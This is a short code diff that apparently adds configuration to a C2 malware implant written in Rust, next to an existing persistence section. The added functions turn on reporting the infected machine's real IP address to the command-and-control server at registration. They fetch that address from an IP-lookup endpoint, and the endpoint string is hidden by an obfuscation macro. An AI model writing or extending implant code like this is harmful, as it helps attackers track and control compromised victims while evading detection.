@@ -248,3 +248,20 @@ pub fn get_lnk_shortcut_name() -> String {
 }
 
 // - - - - - - - - - - </PERSISTENCE> - - - - - - - - - -
+
+// - - - - - - - - - - <REAL IP ADDRESS> - - - - - - - - - -
+
+// When enabled it would reach out to service specified in get_real_ip_endpoint(),
+// and send the real IP during agent's registration/identification with the C2.
+#[inline]
+pub fn send_real_ip_on_start() -> bool {
+    true
+}
+
+// This endpoint is supposed to return caller's IP address as plain-text.
+#[inline]
+pub fn get_real_ip_endpoint() -> String {
+    goldberg_string!("https://checkip.amazonaws.com").to_string()
+}
+
+// - - - - - - - - - - </REAL IP ADDRESS> - - - - - - - - - -
